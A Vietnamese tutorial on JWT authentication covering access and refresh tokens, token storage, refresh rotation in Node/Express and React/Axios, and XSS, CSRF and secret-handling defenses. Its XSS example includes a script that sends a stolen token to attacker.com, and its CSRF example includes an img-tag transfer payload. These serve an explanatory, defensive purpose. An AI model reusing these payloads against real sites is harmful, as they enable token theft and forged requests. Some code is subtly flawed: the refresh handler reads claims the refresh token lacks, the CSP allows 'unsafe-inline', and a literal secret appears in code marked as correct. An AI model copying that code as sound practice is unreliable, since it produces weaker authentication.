# JWT Authentication: Hướng Dẫn Toàn Diện Về Xác Thực Hiện Đại

> **Dành cho developers muốn hiểu sâu về JWT và implement authentication một cách an toàn**

Xác thực người dùng (authentication) là nền tảng của mọi ứng dụng web hiện đại. Nhưng làm sao để xác thực được an toàn, có thể mở rộng, và hoạt động tốt trong môi trường phân tán (distributed systems)? JSON Web Token (JWT) đã trở thành giải pháp phổ biến nhất cho vấn đề này. Trong bài viết này, chúng ta sẽ đi sâu vào JWT từ những khái niệm cơ bản đến các best practices về security.

## Phần 1: JWT Là Gì?

### 1.1 Định Nghĩa và Cấu Trúc

JSON Web Token (JWT) là một chuẩn mở (RFC 7519) để truyền tải thông tin một cách an toàn giữa các bên dưới dạng JSON object. JWT được thiết kế để compact (nhỏ gọn), self-contained (tự chứa đầy đủ thông tin), và có thể verify được tính toàn vẹn.

Một JWT token gồm 3 phần, ngăn cách bởi dấu chấm (`.`):

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**Cấu trúc:**

```
HEADER.PAYLOAD.SIGNATURE
```

#### Header (Phần đầu)

Chứa thông tin về loại token và thuật toán mã hóa:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

#### Payload (Phần dữ liệu)

Chứa các claims (thông tin về user và metadata):

```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "email": "john@example.com",
  "role": "admin",
  "iat": 1516239022,
  "exp": 1516242622
}
```

#### Signature (Chữ ký)

Được tạo bằng cách mã hóa header và payload với secret key:

```
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret
)
```

### 1.2 Tại Sao JWT Được Ưa Chuộng?

JWT giải quyết nhiều vấn đề của phương pháp authentication truyền thống (session-based):

| Tiêu Chí            | Session-Based                       | JWT-Based                       |
| :------------------ | :---------------------------------- | :------------------------------ |
| **Lưu trữ server**  | Cần lưu session trên server         | Không cần lưu trữ (stateless)   |
| **Scalability**     | Khó scale (cần session store chung) | Dễ scale (mỗi server tự verify) |
| **Cross-domain**    | Khó khăn (CORS issues)              | Dễ dàng (token trong header)    |
| **Mobile-friendly** | Phức tạp với native apps            | Đơn giản, chỉ cần gửi token     |
| **Microservices**   | Cần shared session store            | Mỗi service tự verify           |

**Ví dụ thực tế:**

```javascript
// Client gửi login request
const response = await fetch("/api/login", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ email, password }),
});

const { accessToken } = await response.json();

// Sau đó client sử dụng token cho các requests
const data = await fetch("/api/protected-resource", {
  headers: {
    Authorization: `Bearer ${accessToken}`,
  },
});
```

Server không cần lưu gì về session. Mỗi khi nhận request với JWT, server chỉ cần verify signature và đọc thông tin từ payload.

---

## Phần 2: Access Token vs Refresh Token

### 2.1 Tại Sao Cần Hai Loại Token?

Một câu hỏi phổ biến: nếu JWT đã chứa đủ thông tin, tại sao không dùng một token duy nhất?

**Vấn đề với single token:**

- Nếu token có expiry time dài (vd: 30 ngày) → User không cần login lại nhưng **rủi ro security cao** nếu token bị đánh cắp
- Nếu token có expiry time ngắn (vd: 15 phút) → **An toàn hơn** nhưng user phải login liên tục → UX tệ

**Giải pháp: Dual Token Strategy**

Sử dụng kết hợp 2 loại token với mục đích và lifecycle khác nhau:

### 2.2 Access Token (Token Truy Cập)

**Đặc điểm:**

- **Expiry time ngắn**: 5-15 phút
- **Công dụng**: Truy cập protected resources (API endpoints)
- **Lưu trữ**: Trong memory (JavaScript variable) hoặc sessionStorage
- **Rủi ro**: Thấp vì expire nhanh

**Ví dụ payload:**

```json
{
  "sub": "user123",
  "role": "user",
  "permissions": ["read:posts", "write:comments"],
  "iat": 1710000000,
  "exp": 1710000900 // 15 phút sau
}
```

### 2.3 Refresh Token (Token Làm Mới)

**Đặc điểm:**

- **Expiry time dài**: 7-30 ngày
- **Công dụng**: Generate access token mới khi access token hết hạn
- **Lưu trữ**: HttpOnly cookie (an toàn nhất)
- **Rủi ro**: Cao hơn nhưng có cơ chế phòng ngừa (token rotation)

**Ví dụ payload:**

```json
{
  "sub": "user123",
  "tokenFamily": "abc123", // Để detect reuse attacks
  "iat": 1710000000,
  "exp": 1712592000 // 30 ngày sau
}
```

### 2.4 So Sánh Chi Tiết

| Đặc Điểm           | Access Token           | Refresh Token                |
| :----------------- | :--------------------- | :--------------------------- |
| **Mục đích**       | Truy cập API           | Renew access token           |
| **Expiry**         | Ngắn (5-15 phút)       | Dài (7-30 ngày)              |
| **Gửi đến**        | Mọi API request        | Chỉ `/refresh` endpoint      |
| **Lưu trữ**        | Memory/sessionStorage  | HttpOnly cookie              |
| **Có thể revoke?** | Không (expire tự động) | Có (revoke list trên server) |
| **Kích thước**     | Lớn hơn (nhiều claims) | Nhỏ hơn (ít claims)          |

### 2.5 Workflow Hoàn Chỉnh

```
┌─────────────┐                          ┌─────────────┐
│   Client    │                          │   Server    │
└──────┬──────┘                          └──────┬──────┘
       │                                        │
       │  1. POST /login (email, password)     │
       │───────────────────────────────────────>│
       │                                        │
       │  2. Access Token + Refresh Token      │
       │      (Refresh via httpOnly cookie)    │
       │<───────────────────────────────────────│
       │                                        │
       │  3. GET /api/posts                    │
       │     Authorization: Bearer <access>    │
       │───────────────────────────────────────>│
       │                                        │
       │  4. Response data                     │
       │<───────────────────────────────────────│
       │                                        │
       │  [15 phút sau - access token hết hạn] │
       │                                        │
       │  5. GET /api/posts                    │
       │     Authorization: Bearer <expired>   │
       │───────────────────────────────────────>│
       │                                        │
       │  6. 401 Unauthorized                  │
       │<───────────────────────────────────────│
       │                                        │
       │  7. POST /refresh                     │
       │     (Cookie: refresh_token tự động)   │
       │───────────────────────────────────────>│
       │                                        │
       │  8. New Access Token                  │
       │<───────────────────────────────────────│
       │                                        │
       │  9. Retry GET /api/posts              │
       │     Authorization: Bearer <new_token> │
       │───────────────────────────────────────>│
       │                                        │
       │  10. Response data                    │
       │<───────────────────────────────────────│
```

---

## Phần 3: Nơi Lưu Trữ Tokens - Security Tradeoffs

### 3.1 Vấn Đề Quan Trọng Nhất

**Lưu tokens ở đâu?** Đây là quyết định ảnh hưởng trực tiếp đến security của application. Có 3 options phổ biến:

1. LocalStorage
2. SessionStorage
3. HttpOnly Cookies

Mỗi cách có security tradeoffs riêng. Không có giải pháp nào hoàn hảo 100%.

### 3.2 Option 1: LocalStorage

**Cách hoạt động:**

```javascript
// Lưu token
localStorage.setItem("accessToken", token);

// Đọc token
const token = localStorage.getItem("accessToken");

// Sử dụng
fetch("/api/data", {
  headers: {
    Authorization: `Bearer ${token}`,
  },
});
```

**Ưu điểm:**

- ✅ Đơn giản, dễ implement
- ✅ Persist sau khi đóng browser (user không cần login lại)
- ✅ Có thể access từ JavaScript

**Nhược điểm:**

- ❌ **Dễ bị XSS attacks** (Cross-Site Scripting)
- ❌ Bất kỳ script nào trên page đều có thể đọc
- ❌ Không tự động expire khi đóng tab

**Khi nào dùng:**

- App đơn giản, không có user-generated content
- Đã có strong XSS protection
- Convenience quan trọng hơn maximum security

### 3.3 Option 2: SessionStorage

**Cách hoạt động:**

```javascript
// Giống localStorage nhưng clear khi đóng tab
sessionStorage.setItem("accessToken", token);
const token = sessionStorage.getItem("accessToken");
```

**Ưu điểm:**

- ✅ Tự động clear khi đóng tab/window
- ✅ Tốt hơn localStorage một chút (session-only)

**Nhược điểm:**

- ❌ Vẫn dễ bị XSS attacks
- ❌ UX tệ hơn (phải login lại mỗi tab mới)
- ❌ Không work với multi-tab scenarios

**Khi nào dùng:**

- App yêu cầu security cao hơn localStorage
- Chấp nhận UX trade-off (re-login mỗi session)

### 3.4 Option 3: HttpOnly Cookies (Recommended)

**Cách hoạt động:**

```javascript
// Server-side: Set cookie khi login
res.cookie("refreshToken", token, {
  httpOnly: true, // JavaScript KHÔNG thể access
  secure: true, // Chỉ gửi qua HTTPS
  sameSite: "strict", // Prevent CSRF
  maxAge: 7 * 24 * 60 * 60 * 1000, // 7 ngày
});

// Client-side: Cookie tự động gửi với mọi request
// Developer không cần làm gì!
```

**Ưu điểm:**

- ✅ **Không thể access từ JavaScript** → Immune to XSS
- ✅ Tự động gửi với mọi request (no code needed)
- ✅ `sameSite` attribute ngăn CSRF attacks
- ✅ Server control expiry và revocation

**Nhược điểm:**

- ❌ **Vẫn có thể bị CSRF attacks** nếu config sai
- ❌ Không work với cross-domain requests (cần setup CORS cẩn thận)
- ❌ Phức tạp hơn với mobile apps và third-party clients

**Khi nào dùng:**

- Production applications với security requirements cao
- Web apps (không phải pure API servers)
- Có kiểm soát cả frontend và backend

### 3.5 Best Practice: Hybrid Approach

**Chiến lược tốt nhất:**

```
┌─────────────────────────────────────────┐
│         Dual Token Strategy             │
├─────────────────────────────────────────┤
│                                         │
│  Access Token (ngắn hạn):              │
│  → Lưu trong memory (JS variable)      │
│  → Hoặc sessionStorage                 │
│  → Dùng cho API requests               │
│                                         │
│  Refresh Token (dài hạn):              │
│  → Lưu trong httpOnly cookie           │
│  → Chỉ gửi đến /refresh endpoint       │
│  → Server có thể revoke                │
│                                         │
└─────────────────────────────────────────┘
```

**Implementation:**

```javascript
// Client-side: Token management service
class TokenService {
  // Access token in memory (chỉ tồn tại trong session)
  #accessToken = null;

  setAccessToken(token) {
    this.#accessToken = token;
  }

  getAccessToken() {
    return this.#accessToken;
  }

  clearAccessToken() {
    this.#accessToken = null;
  }

  // Refresh token được server set qua httpOnly cookie
  // Client không cần manage!
}

// Auto-refresh logic
async function fetchWithAuth(url, options = {}) {
  const accessToken = tokenService.getAccessToken();

  let response = await fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      Authorization: `Bearer ${accessToken}`,
    },
  });

  // Nếu 401, thử refresh
  if (response.status === 401) {
    const newToken = await refreshAccessToken();
    tokenService.setAccessToken(newToken);

    // Retry request với token mới
    response = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        Authorization: `Bearer ${newToken}`,
      },
    });
  }

  return response;
}

async function refreshAccessToken() {
  // Refresh token tự động gửi qua cookie
  const response = await fetch("/api/refresh", {
    method: "POST",
    credentials: "include", // Gửi cookies
  });

  const { accessToken } = await response.json();
  return accessToken;
}
```

### 3.6 So Sánh Bảo Mật

| Storage Method      | XSS Protection | CSRF Protection | Best For        |
| :------------------ | :------------: | :-------------: | :-------------- |
| **localStorage**    | ❌ Vulnerable  |     ✅ Safe     | Simple apps     |
| **sessionStorage**  | ❌ Vulnerable  |     ✅ Safe     | Short sessions  |
| **httpOnly Cookie** |  ✅ Protected  | ⚠️ Needs config | Production apps |
| **Memory only**     |  ✅ Protected  |  ✅ Protected   | Access tokens   |
| **Hybrid**          |  ✅ Protected  |  ✅ Protected   | **Recommended** |

---

## Phần 4: Token Refresh Flow - Chi Tiết Implementation

### 4.1 Tại Sao Cần Refresh Mechanism?

Giả sử access token của bạn expire sau 15 phút:

- **Không có refresh:** User phải login lại sau mỗi 15 phút → UX tệ
- **Có refresh:** App tự động renew token, user không bị interrupt

Refresh flow là cầu nối giữa security (short-lived tokens) và UX (seamless authentication).

### 4.2 Basic Refresh Flow

**Step-by-step:**

```
1. User login
   ↓
2. Server tạo access token (15 min) + refresh token (7 days)
   ↓
3. Client lưu access token (memory)
   Server set refresh token (httpOnly cookie)
   ↓
4. Client dùng access token cho mọi API requests
   ↓
5. Access token hết hạn → API trả 401
   ↓
6. Client gọi /refresh endpoint (tự động gửi refresh token qua cookie)
   ↓
7. Server verify refresh token → tạo access token mới
   ↓
8. Client lưu access token mới và retry request failed
```

### 4.3 Server-Side Implementation

**Backend (Node.js + Express):**

```javascript
const express = require("express");
const jwt = require("jsonwebtoken");
const cookieParser = require("cookie-parser");

const app = express();
app.use(cookieParser());
app.use(express.json());

// Secret keys (PHẢI lưu trong environment variables!)
const ACCESS_SECRET = process.env.ACCESS_SECRET;
const REFRESH_SECRET = process.env.REFRESH_SECRET;

// Token storage (production: dùng Redis)
const refreshTokens = new Set();

// 1. Login endpoint
app.post("/api/login", async (req, res) => {
  const { email, password } = req.body;

  // Verify credentials (simplified)
  const user = await verifyCredentials(email, password);
  if (!user) {
    return res.status(401).json({ error: "Invalid credentials" });
  }

  // Generate tokens
  const accessToken = jwt.sign(
    {
      sub: user.id,
      email: user.email,
      role: user.role,
    },
    ACCESS_SECRET,
    { expiresIn: "15m" },
  );

  const refreshToken = jwt.sign({ sub: user.id }, REFRESH_SECRET, {
    expiresIn: "7d",
  });

  // Lưu refresh token (production: Redis với expiry)
  refreshTokens.add(refreshToken);

  // Set refresh token vào httpOnly cookie
  res.cookie("refreshToken", refreshToken, {
    httpOnly: true,
    secure: process.env.NODE_ENV === "production",
    sameSite: "strict",
    maxAge: 7 * 24 * 60 * 60 * 1000, // 7 ngày
  });

  // Trả access token trong response body
  res.json({ accessToken });
});

// 2. Refresh endpoint
app.post("/api/refresh", (req, res) => {
  const refreshToken = req.cookies.refreshToken;

  if (!refreshToken) {
    return res.status(401).json({ error: "No refresh token" });
  }

  // Verify refresh token còn valid
  if (!refreshTokens.has(refreshToken)) {
    return res.status(403).json({ error: "Invalid refresh token" });
  }

  try {
    // Verify JWT signature
    const payload = jwt.verify(refreshToken, REFRESH_SECRET);

    // Generate new access token
    const newAccessToken = jwt.sign(
      {
        sub: payload.sub,
        email: payload.email,
        role: payload.role,
      },
      ACCESS_SECRET,
      { expiresIn: "15m" },
    );

    res.json({ accessToken: newAccessToken });
  } catch (error) {
    return res.status(403).json({ error: "Invalid or expired token" });
  }
});

// 3. Protected endpoint example
app.get("/api/protected", verifyAccessToken, (req, res) => {
  res.json({
    message: "Protected data",
    user: req.user,
  });
});

// 4. Logout endpoint
app.post("/api/logout", (req, res) => {
  const refreshToken = req.cookies.refreshToken;

  // Remove từ whitelist
  refreshTokens.delete(refreshToken);

  // Clear cookie
  res.clearCookie("refreshToken");

  res.json({ message: "Logged out" });
});

// Middleware verify access token
function verifyAccessToken(req, res, next) {
  const authHeader = req.headers.authorization;

  if (!authHeader || !authHeader.startsWith("Bearer ")) {
    return res.status(401).json({ error: "No access token" });
  }

  const token = authHeader.substring(7);

  try {
    const payload = jwt.verify(token, ACCESS_SECRET);
    req.user = payload;
    next();
  } catch (error) {
    return res.status(401).json({ error: "Invalid or expired access token" });
  }
}
```

### 4.4 Client-Side Implementation

**Frontend (React với Axios):**

```javascript
import axios from "axios";

// Axios instance với interceptors
const api = axios.create({
  baseURL: "http://localhost:3000/api",
  withCredentials: true, // Gửi cookies
});

// Store access token trong memory
let accessToken = null;

export function setAccessToken(token) {
  accessToken = token;
}

export function getAccessToken() {
  return accessToken;
}

// Request interceptor: tự động thêm Authorization header
api.interceptors.request.use(
  (config) => {
    if (accessToken) {
      config.headers.Authorization = `Bearer ${accessToken}`;
    }
    return config;
  },
  (error) => Promise.reject(error),
);

// Response interceptor: tự động refresh khi 401
api.interceptors.response.use(
  (response) => response, // Success case: không làm gì
  async (error) => {
    const originalRequest = error.config;

    // Nếu lỗi 401 và chưa retry
    if (error.response?.status === 401 && !originalRequest._retry) {
      originalRequest._retry = true;

      try {
        // Gọi refresh endpoint
        const response = await axios.post(
          "http://localhost:3000/api/refresh",
          {},
          { withCredentials: true },
        );

        const newAccessToken = response.data.accessToken;
        setAccessToken(newAccessToken);

        // Retry request với token mới
        originalRequest.headers.Authorization = `Bearer ${newAccessToken}`;
        return api(originalRequest);
      } catch (refreshError) {
        // Refresh thất bại → logout user
        setAccessToken(null);
        window.location.href = "/login";
        return Promise.reject(refreshError);
      }
    }

    return Promise.reject(error);
  },
);

// Login function
export async function login(email, password) {
  const response = await api.post("/login", { email, password });
  const { accessToken } = response.data;
  setAccessToken(accessToken);
  return response.data;
}

// Logout function
export async function logout() {
  await api.post("/logout");
  setAccessToken(null);
}

export default api;
```

**Usage trong React components:**

```javascript
import React, { useEffect, useState } from "react";
import api from "./apiClient";

function Dashboard() {
  const [data, setData] = useState(null);

  useEffect(() => {
    // Gọi protected API - auto refresh nếu cần
    api
      .get("/protected")
      .then((res) => setData(res.data))
      .catch((err) => console.error(err));
  }, []);

  return <div>{data && <pre>{JSON.stringify(data, null, 2)}</pre>}</div>;
}
```

### 4.5 Advanced: Token Rotation

**Vấn đề với basic refresh:**

Nếu refresh token bị đánh cắp, attacker có thể dùng nó để generate access tokens liên tục cho đến khi refresh token expire (7-30 ngày).

**Giải pháp: Refresh Token Rotation**

Mỗi lần refresh, server:

1. Verify refresh token cũ
2. Generate access token mới
3. **Generate refresh token mới** (thay thế token cũ)
4. Revoke refresh token cũ

```javascript
// Server: refresh với rotation
app.post("/api/refresh", async (req, res) => {
  const oldRefreshToken = req.cookies.refreshToken;

  if (!refreshTokens.has(oldRefreshToken)) {
    return res.status(403).json({ error: "Invalid refresh token" });
  }

  try {
    const payload = jwt.verify(oldRefreshToken, REFRESH_SECRET);

    // Generate NEW tokens
    const newAccessToken = jwt.sign(
      { sub: payload.sub, email: payload.email, role: payload.role },
      ACCESS_SECRET,
      { expiresIn: "15m" },
    );

    const newRefreshToken = jwt.sign({ sub: payload.sub }, REFRESH_SECRET, {
      expiresIn: "7d",
    });

    // Rotate: xóa cũ, thêm mới
    refreshTokens.delete(oldRefreshToken);
    refreshTokens.add(newRefreshToken);

    // Set new refresh token cookie
    res.cookie("refreshToken", newRefreshToken, {
      httpOnly: true,
      secure: true,
      sameSite: "strict",
      maxAge: 7 * 24 * 60 * 60 * 1000,
    });

    res.json({ accessToken: newAccessToken });
  } catch (error) {
    return res.status(403).json({ error: "Invalid token" });
  }
});
```

**Benefits:**

- ✅ Giảm thời gian window cho token theft
- ✅ Detect reuse attacks (token cũ đã bị revoke)
- ✅ Automatic cleanup của expired tokens

---

## Phần 5: Security Concerns - Những Điều Cần Biết

### 5.1 XSS (Cross-Site Scripting) Attacks

**Threat scenario:**

Attacker inject malicious script vào website:

```html
<!-- Ví dụ: comment section không sanitize input -->
<script>
  // Steal token từ localStorage
  const token = localStorage.getItem("accessToken");
  fetch("https://attacker.com/steal?token=" + token);
</script>
```

**Mitigation strategies:**

1. **Không lưu sensitive tokens trong localStorage**

   ```javascript
   // ❌ BAD
   localStorage.setItem("accessToken", token);

   // ✅ GOOD - dùng memory hoặc httpOnly cookie
   let accessToken = null; // Memory variable
   ```

2. **Content Security Policy (CSP)**

   ```javascript
   // Server response headers
   app.use((req, res, next) => {
     res.setHeader(
       "Content-Security-Policy",
       "default-src 'self'; script-src 'self' 'unsafe-inline'",
     );
     next();
   });
   ```

3. **Sanitize user input**

   ```javascript
   import DOMPurify from "dompurify";

   // Trước khi render user content
   const cleanHTML = DOMPurify.sanitize(userInput);
   ```

4. **HttpOnly cookies cho refresh tokens**
   ```javascript
   res.cookie("refreshToken", token, {
     httpOnly: true, // JavaScript không thể access
     secure: true,
     sameSite: "strict",
   });
   ```

### 5.2 CSRF (Cross-Site Request Forgery) Attacks

**Threat scenario:**

User đang login vào `yourbank.com`. Attacker gửi email với link:

```html
<!-- Email: "Click here for free gift!" -->
<img src="https://yourbank.com/transfer?to=attacker&amount=1000" />
```

Browser tự động gửi cookies của user → Request được execute!

**Mitigation strategies:**

1. **SameSite Cookie Attribute**

   ```javascript
   res.cookie("refreshToken", token, {
     httpOnly: true,
     secure: true,
     sameSite: "strict", // Hoặc 'lax'
   });
   ```

   | SameSite Value | Protection | Use Case                                        |
   | :------------- | :--------- | :---------------------------------------------- |
   | `strict`       | Strongest  | Cookie KHÔNG gửi với cross-site requests        |
   | `lax`          | Medium     | Cookie gửi với top-level navigations (GET only) |
   | `none`         | Weakest    | Cookie gửi với mọi requests (cần HTTPS)         |

2. **CSRF Token Pattern**

   ```javascript
   // Server: generate CSRF token
   const csrfToken = generateRandomToken();
   req.session.csrfToken = csrfToken;

   // Client: gửi token trong header hoặc form
   fetch("/api/transfer", {
     method: "POST",
     headers: {
       "X-CSRF-Token": csrfToken,
     },
     body: JSON.stringify({ to, amount }),
   });

   // Server: verify token
   function verifyCsrfToken(req, res, next) {
     const token = req.headers["x-csrf-token"];
     if (token !== req.session.csrfToken) {
       return res.status(403).json({ error: "Invalid CSRF token" });
     }
     next();
   }
   ```

3. **Double Submit Cookie Pattern**

   ```javascript
   // Đơn giản hơn: không cần session storage
   // Server set CSRF token vào cookie (readable từ JS)
   res.cookie("csrf-token", csrfToken, {
     httpOnly: false, // Client cần đọc được
     secure: true,
     sameSite: "strict",
   });

   // Client đọc từ cookie và gửi lại trong header
   const csrfToken = getCookie("csrf-token");
   fetch("/api/action", {
     headers: {
       "X-CSRF-Token": csrfToken,
     },
   });
   ```

### 5.3 JWT Security Best Practices

#### 5.3.1 Secret Key Management

```javascript
// ❌ NEVER hardcode secrets
const SECRET = "mySecretKey123";

// ✅ Use environment variables
const SECRET = process.env.JWT_SECRET;

// ✅ Use strong secrets (32+ characters, random)
// openssl rand -base64 32
const SECRET = "Xy7K9mP4vN2qW8tE6rA3sD5fG7hJ1kL4";
```

#### 5.3.2 Token Expiry Time

```javascript
// ❌ Access token quá dài
jwt.sign(payload, SECRET, { expiresIn: "30d" });

// ✅ Access token ngắn
jwt.sign(payload, ACCESS_SECRET, { expiresIn: "15m" });

// ✅ Refresh token dài hơn nhưng có rotation
jwt.sign(payload, REFRESH_SECRET, { expiresIn: "7d" });
```

#### 5.3.3 Sensitive Data Trong Payload

```javascript
// ❌ NEVER lưu sensitive data
const payload = {
  userId: user.id,
  email: user.email,
  password: user.password, // ❌ NGUY HIỂM!
  creditCard: user.creditCard, // ❌ NGUY HIỂM!
  ssn: user.ssn, // ❌ NGUY HIỂM!
};

// ✅ Chỉ lưu identifiers và public info
const payload = {
  sub: user.id, // User ID
  email: user.email, // Public info
  role: user.role, // Authorization info
  iat: Date.now(),
};
```

**Lý do:** JWT có thể decode dễ dàng (base64):

```javascript
// Bất kỳ ai cũng có thể decode JWT
const [header, payload, signature] = token.split(".");
const decodedPayload = JSON.parse(atob(payload));
console.log(decodedPayload); // Có thể đọc tất cả!
```

#### 5.3.4 Algorithm Confusion Attack

```javascript
// ❌ Không verify algorithm
jwt.verify(token, SECRET);

// ✅ Specify algorithms explicitly
jwt.verify(token, SECRET, {
  algorithms: ["HS256"], // Chỉ accept HS256
});

// ❌ NEVER use 'none' algorithm trong production
// Attacker có thể tạo unsigned tokens
```

#### 5.3.5 Token Revocation Strategy

JWT là **stateless** → Không thể revoke một token specific. Solutions:

**Option 1: Blacklist** (Redis)

```javascript
// Khi logout hoặc detect fraud
await redis.setex(`blacklist:${tokenId}`, TTL, "1");

// Verify middleware check blacklist
async function verifyToken(req, res, next) {
  const token = extractToken(req);
  const payload = jwt.verify(token, SECRET);

  // Check blacklist
  const isBlacklisted = await redis.exists(`blacklist:${payload.jti}`);
  if (isBlacklisted) {
    return res.status(401).json({ error: "Token revoked" });
  }

  req.user = payload;
  next();
}
```

**Option 2: Whitelist** (cho refresh tokens)

```javascript
// Chỉ accept refresh tokens trong whitelist
const validRefreshTokens = new Set();

// Add on login
validRefreshTokens.add(refreshToken);

// Check on refresh
if (!validRefreshTokens.has(refreshToken)) {
  return res.status(403).json({ error: "Invalid token" });
}

// Remove on logout
validRefreshTokens.delete(refreshToken);
```

**Option 3: Short expiry + refresh rotation**

- Access token ngắn (5-15 min) → Tự expire nhanh
- Refresh token có rotation → Old tokens tự động invalid

### 5.4 HTTPS is Mandatory

```javascript
// ❌ NEVER sử dụng JWT qua HTTP
// Tokens có thể bị intercept trong transit

// ✅ Force HTTPS trong production
if (process.env.NODE_ENV === "production" && !req.secure) {
  return res.redirect("https://" + req.headers.host + req.url);
}

// ✅ Set secure flag cho cookies
res.cookie("refreshToken", token, {
  httpOnly: true,
  secure: true, // Chỉ gửi qua HTTPS
  sameSite: "strict",
});
```

### 5.5 Rate Limiting

```javascript
const rateLimit = require("express-rate-limit");

// Limit login attempts
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 phút
  max: 5, // Max 5 requests
  message: "Too many login attempts, please try again later",
});

app.post("/api/login", loginLimiter, handleLogin);

// Limit refresh attempts
const refreshLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 10,
  message: "Too many refresh attempts",
});

app.post("/api/refresh", refreshLimiter, handleRefresh);
```

### 5.6 Security Checklist

Trước khi deploy JWT authentication:

- [ ] Access tokens có expiry ngắn (≤ 15 phút)
- [ ] Refresh tokens sử dụng httpOnly cookies
- [ ] Secret keys lưu trong environment variables (không hardcode)
- [ ] Secret keys đủ mạnh (32+ characters, random)
- [ ] HTTPS được enforce trong production
- [ ] sameSite='strict' cho cookies
- [ ] CSRF protection enabled
- [ ] Content Security Policy headers configured
- [ ] User input được sanitize (prevent XSS)
- [ ] Rate limiting cho login và refresh endpoints
- [ ] Token rotation implemented cho refresh tokens
- [ ] Logging và monitoring cho suspicious activities
- [ ] Sensitive data KHÔNG lưu trong JWT payload
- [ ] Algorithm được specify explicitly khi verify
- [ ] Blacklist/whitelist mechanism cho revocation

---

## Kết Luận

JWT authentication là một công cụ mạnh mẽ nhưng cần được implement cẩn thận. Những điểm chính cần nhớ:

**1. Dual Token Strategy**

- Access token ngắn (15 phút) trong memory
- Refresh token dài (7 ngày) trong httpOnly cookie
- Kết hợp cả security và UX

**2. Storage Matters**

- **KHÔNG** lưu tokens trong localStorage (XSS vulnerability)
- **NÊN** dùng httpOnly cookies cho refresh tokens
- **NÊN** dùng memory variables cho access tokens

**3. Refresh Flow**

- Auto-refresh khi access token expire
- Token rotation để giảm risk
- Proper error handling và retry logic

**4. Security First**

- HTTPS mandatory
- Strong secrets trong environment variables
- CSRF protection với sameSite cookies
- XSS protection với CSP và input sanitization
- Rate limiting cho sensitive endpoints
- Token revocation strategy

**5. Production Checklist**

- Environment variables cho secrets
- Short expiry times
- Proper cookie configuration
- HTTPS enforcement
- Monitoring và logging

JWT không phải silver bullet cho mọi use case, nhưng khi được implement đúng cách với những best practices trên, nó là giải pháp authentication mạnh mẽ, scalable, và an toàn cho modern web applications.

---

**Next Steps:**

- Implement JWT authentication trong project của bạn
- Set up proper testing cho authentication flows
- Monitor security logs cho suspicious activities
- Consider OAuth 2.0 cho third-party integrations
- Explore alternative authentication methods (OAuth, SAML, WebAuthn)

**Resources:**

- [RFC 7519 - JWT Standard](https://tools.ietf.org/html/rfc7519)
- [OWASP JWT Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [jwt.io - JWT Debugger](https://jwt.io/)
